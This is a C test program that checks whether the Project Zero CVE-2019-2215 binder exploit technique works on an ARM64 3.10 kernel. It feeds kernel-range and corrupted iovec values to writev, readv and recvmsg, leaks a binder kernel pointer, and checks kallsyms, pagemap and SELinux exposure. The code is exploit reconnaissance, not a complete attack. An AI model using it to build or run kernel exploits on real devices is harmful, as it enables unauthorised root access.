/*
 * access_ok_test.c — Empirically test whether writev/readv with
 * kernel-range iov_base gets rejected by access_ok on this kernel.
 *
 * The P0 CVE-2019-2215 exploit relies on __copy_from_user skipping
 * access_ok checks (kernel 4.4 behavior). On kernel 3.10 ARM64,
 * we need to verify whether this holds or not.
 *
 * Test approach:
 *   1. Create a pipe
 *   2. Set up an iovec array where one entry has iov_base pointing
 *      to a known kernel address range (0xffffffc0...)
 *   3. Try writev() — if access_ok blocks it, writev returns -EFAULT
 *   4. Also test readv() with kernel address iov_base
 *   5. Test recvmsg() path (used by clobber_addr_limit)
 *
 * This does NOT exploit anything — it tests the syscall boundary.
 *
 * Compile: gcc -static -O2 -o access_ok_test access_ok_test.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define BINDER_VERSION _IOWR('b', 9, struct binder_version)
struct binder_version { signed long protocol_version; };

/* Check if value looks like kernel pointer */
static int is_kptr(uint64_t val) {
    return (val >= 0xffffffc000000000ULL && val <= 0xffffffffffffffffULL);
}

static void test_writev_kernel_addr(void) {
    printf("\n=== TEST 1: writev() with kernel-range iov_base ===\n");

    int pfd[2];
    if (pipe(pfd) < 0) {
        printf("  pipe() failed: %s\n", strerror(errno));
        return;
    }

    /* First, write some data to fill the pipe a bit */
    char buf[64];
    memset(buf, 'A', sizeof(buf));

    /* Normal iovec — should work */
    struct iovec iov_normal = { .iov_base = buf, .iov_len = 32 };
    errno = 0;
    ssize_t ret = writev(pfd[1], &iov_normal, 1);
    printf("  writev(normal addr %p, 32): ret=%zd errno=%d\n",
           buf, ret, errno);

    /* Kernel address iovec — will access_ok block this? */
    struct iovec iov_kern = {
        .iov_base = (void *)0xffffffc080000000ULL,
        .iov_len = 8
    };
    errno = 0;
    ret = writev(pfd[1], &iov_kern, 1);
    printf("  writev(kernel addr 0xffffffc080000000, 8): ret=%zd errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret < 0 && errno == EFAULT) {
        printf("  -> EFAULT: access_ok BLOCKS kernel address in writev\n");
        printf("  -> P0 iovec leak technique WILL NOT WORK on this kernel\n");
    } else if (ret > 0) {
        printf("  -> SUCCESS: writev accepted kernel address!\n");
        printf("  -> P0 iovec leak technique MAY WORK\n");
    } else {
        printf("  -> Unexpected result\n");
    }

    /* Test with the actual binder mmap kernel pointer */
    int bfd = open("/dev/binder", O_RDWR);
    if (bfd >= 0) {
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap != MAP_FAILED) {
            uint64_t kptr = ((uint64_t *)bmap)[0];
            if (is_kptr(kptr)) {
                printf("\n  Using REAL kernel pointer from binder: 0x%016llx\n",
                       (unsigned long long)kptr);
                struct iovec iov_real = {
                    .iov_base = (void *)kptr,
                    .iov_len = 8
                };
                errno = 0;
                ret = writev(pfd[1], &iov_real, 1);
                printf("  writev(real kptr 0x%016llx, 8): ret=%zd errno=%d (%s)\n",
                       (unsigned long long)kptr, ret, errno, strerror(errno));
            }
            munmap(bmap, 4096);
        }
        close(bfd);
    }

    /* Drain pipe */
    char drain[256];
    while (read(pfd[0], drain, sizeof(drain)) > 0);

    close(pfd[0]);
    close(pfd[1]);
}

static void test_readv_kernel_addr(void) {
    printf("\n=== TEST 2: readv() with kernel-range iov_base ===\n");

    int pfd[2];
    if (pipe(pfd) < 0) return;

    /* Put some data in the pipe first */
    char data[64] = "HELLO_FROM_PIPE_READV_TEST";
    write(pfd[1], data, 32);

    /* Try readv with kernel address destination */
    struct iovec iov_kern = {
        .iov_base = (void *)0xffffffc080000000ULL,
        .iov_len = 8
    };
    errno = 0;
    ssize_t ret = readv(pfd[0], &iov_kern, 1);
    printf("  readv(kernel addr, 8): ret=%zd errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret < 0 && errno == EFAULT) {
        printf("  -> EFAULT: access_ok BLOCKS kernel address in readv\n");
    } else if (ret > 0) {
        printf("  -> SUCCESS: readv wrote to kernel address!\n");
        printf("  -> P0 clobber technique MAY WORK via readv path\n");
    }

    close(pfd[0]);
    close(pfd[1]);
}

static void test_recvmsg_kernel_addr(void) {
    printf("\n=== TEST 3: recvmsg() with kernel-range iov_base ===\n");

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        printf("  socketpair() failed: %s\n", strerror(errno));
        return;
    }

    /* Send some data */
    char data[32] = "RECVMSG_TEST_DATA";
    send(sv[0], data, 16, 0);

    /* Try recvmsg with kernel address iov_base */
    struct iovec iov_kern = {
        .iov_base = (void *)0xffffffc080000000ULL,
        .iov_len = 8
    };
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov_kern;
    msg.msg_iovlen = 1;

    errno = 0;
    ssize_t ret = recvmsg(sv[1], &msg, 0);
    printf("  recvmsg(kernel addr iov_base, 8): ret=%zd errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret < 0 && errno == EFAULT) {
        printf("  -> EFAULT: access_ok BLOCKS kernel address in recvmsg\n");
        printf("  -> P0 clobber technique WILL NOT WORK via recvmsg\n");
    } else if (ret > 0) {
        printf("  -> SUCCESS: recvmsg wrote to kernel address!\n");
        printf("  -> P0 clobber technique WORKS via recvmsg\n");
    }

    close(sv[0]);
    close(sv[1]);
}

static void test_multi_iovec_partial(void) {
    printf("\n=== TEST 4: writev() with mixed normal+kernel iovecs ===\n");
    printf("  (Tests if partial write succeeds before hitting kernel iov)\n");

    int pfd[2];
    if (pipe(pfd) < 0) return;

    char buf1[32], buf2[32];
    memset(buf1, 'X', sizeof(buf1));
    memset(buf2, 'Y', sizeof(buf2));

    /* Array: [normal, normal, KERNEL, normal]
     * Does writev write the first two and then fail? Or fail entirely? */
    struct iovec iovs[4] = {
        { .iov_base = buf1, .iov_len = 16 },
        { .iov_base = buf2, .iov_len = 16 },
        { .iov_base = (void *)0xffffffc080000000ULL, .iov_len = 8 },
        { .iov_base = buf1, .iov_len = 16 },
    };

    errno = 0;
    ssize_t ret = writev(pfd[1], iovs, 4);
    printf("  writev(4 iovs, #3 is kernel): ret=%zd errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret == 32) {
        printf("  -> Wrote 32 bytes (first 2 iovs), stopped at kernel iov\n");
        printf("  -> PARTIAL WRITE: access_ok checked per-iov during copy\n");
        printf("  -> THIS IS THE P0 TECHNIQUE BEHAVIOR!\n");
        printf("  -> If iov_len is corrupted to huge value, writev writes\n");
        printf("     from valid iov_base, amount = min(iov_len, pipe_space)\n");
    } else if (ret < 0 && errno == EFAULT) {
        printf("  -> EFAULT on entire writev (pre-checked all iovecs)\n");
        printf("  -> P0 technique blocked: kernel validates all iovs upfront\n");
    } else if (ret == 56) {
        printf("  -> Wrote ALL 56 bytes including from kernel address!\n");
        printf("  -> access_ok completely bypassed!\n");
    } else {
        printf("  -> Partial: wrote %zd bytes\n", ret);
    }

    /* Read back what was written */
    if (ret > 0) {
        char readback[128];
        memset(readback, 0, sizeof(readback));
        ssize_t nr = read(pfd[0], readback, ret);
        printf("  Read back %zd bytes: ", nr);
        int i;
        for (i = 0; i < nr && i < 48; i++) {
            printf("%02x ", (unsigned char)readback[i]);
        }
        printf("\n");
    }

    close(pfd[0]);
    close(pfd[1]);
}

static void test_huge_iov_len(void) {
    printf("\n=== TEST 5: writev() with valid base + huge iov_len ===\n");
    printf("  (Simulates what happens after UAF corruption of iov_len)\n");

    int pfd[2];
    if (pipe(pfd) < 0) return;

    /* Make pipe non-blocking so writev doesn't hang */
    fcntl(pfd[1], F_SETFL, O_NONBLOCK);

    char buf[4096];
    memset(buf, 'Z', sizeof(buf));

    /* Huge iov_len but valid iov_base — this is what the P0 exploit
     * actually relies on for the leak. The corrupted iov_len is a
     * kernel address (huge number), but iov_base is a valid user addr.
     * writev will try to copy min(iov_len, pipe_space) bytes from
     * iov_base into the pipe. */
    struct iovec iov = {
        .iov_base = buf,
        .iov_len = 0xffffffc080000000ULL  /* Simulated corrupted len */
    };

    errno = 0;
    ssize_t ret = writev(pfd[1], &iov, 1);
    printf("  writev(valid base, len=0xffffffc080000000): ret=%zd errno=%d (%s)\n",
           ret, errno, strerror(errno));

    if (ret > 0) {
        printf("  -> Wrote %zd bytes! Pipe accepted huge iov_len\n", ret);
        printf("  -> This confirms: corrupted iov_len with valid iov_base WORKS\n");
        printf("  -> The return value tells us how much pipe space was available\n");
    } else if (ret < 0 && errno == EFAULT) {
        printf("  -> EFAULT: kernel rejected huge iov_len\n");
    } else if (ret < 0 && errno == EAGAIN) {
        printf("  -> EAGAIN: pipe full (expected with non-blocking)\n");
    }

    close(pfd[0]);
    close(pfd[1]);
}

static void test_proc_access(void) {
    printf("\n=== TEST 6: /proc info leak checks ===\n");

    /* /proc/self/pagemap — needed for physmap approach */
    int pgfd = open("/proc/self/pagemap", O_RDONLY);
    printf("  /proc/self/pagemap: %s\n",
           pgfd >= 0 ? "READABLE" : strerror(errno));
    if (pgfd >= 0) close(pgfd);

    /* /proc/kallsyms */
    int ksfd = open("/proc/kallsyms", O_RDONLY);
    if (ksfd >= 0) {
        char line[256];
        int n = read(ksfd, line, sizeof(line)-1);
        if (n > 0) {
            line[n] = 0;
            /* Check if addresses are zeroed (kptr_restrict) */
            if (line[0] == '0' && line[1] == '0' && line[2] == '0' && line[3] == '0') {
                printf("  /proc/kallsyms: READABLE but addresses zeroed (kptr_restrict)\n");
            } else {
                printf("  /proc/kallsyms: READABLE with addresses!\n");
                printf("  First line: %s\n", line);
            }
        }
        close(ksfd);
    } else {
        printf("  /proc/kallsyms: %s\n", strerror(errno));
    }

    /* dmesg (kernel ring buffer) */
    {
        /* Try /dev/kmsg */
        int kmfd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
        printf("  /dev/kmsg: %s\n", kmfd >= 0 ? "READABLE" : strerror(errno));
        if (kmfd >= 0) close(kmfd);
    }

    /* Check kernel version string for exact build */
    {
        char ver[256];
        int vfd = open("/proc/version", O_RDONLY);
        if (vfd >= 0) {
            int n = read(vfd, ver, sizeof(ver)-1);
            if (n > 0) { ver[n] = 0; printf("  Kernel: %s", ver); }
            close(vfd);
        }
    }

    /* SELinux mode */
    {
        char mode[32];
        int mfd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (mfd >= 0) {
            int n = read(mfd, mode, sizeof(mode)-1);
            if (n > 0) { mode[n] = 0; printf("  SELinux enforce: %s\n", mode); }
            close(mfd);
        }
    }
}

int main(void) {
    printf("=== ACCESS_OK EMPIRICAL TEST ===\n");
    printf("uid=%u gid=%u\n", getuid(), getgid());
    printf("sizeof(void*)=%zu (expect 8 for ARM64)\n", sizeof(void *));

    test_writev_kernel_addr();
    test_readv_kernel_addr();
    test_recvmsg_kernel_addr();
    test_multi_iovec_partial();
    test_huge_iov_len();
    test_proc_access();

    printf("\n=== SUMMARY ===\n");
    printf("If tests 1-3 all show EFAULT:\n");
    printf("  -> access_ok enforced on ALL copy_*_user paths\n");
    printf("  -> P0 exploit technique FUNDAMENTALLY BLOCKED\n");
    printf("  -> Need alternative: func ptr hijack, ret2dir, or physmap\n");
    printf("\nIf test 4 shows partial write (32 bytes):\n");
    printf("  -> Kernel checks access_ok per-iov during copy, not upfront\n");
    printf("  -> P0 leak via corrupted iov_len with valid iov_base WORKS\n");
    printf("  -> Key insight: we don't need kernel iov_base, just huge iov_len!\n");
    printf("\nIf test 5 shows successful write:\n");
    printf("  -> Corrupted iov_len with valid iov_base is accepted\n");
    printf("  -> The P0 leak technique works differently than expected:\n");
    printf("     It's the RETURN VALUE that leaks info, not kernel memory read\n");

    printf("\n=== TEST COMPLETE ===\n");
    return 0;
}
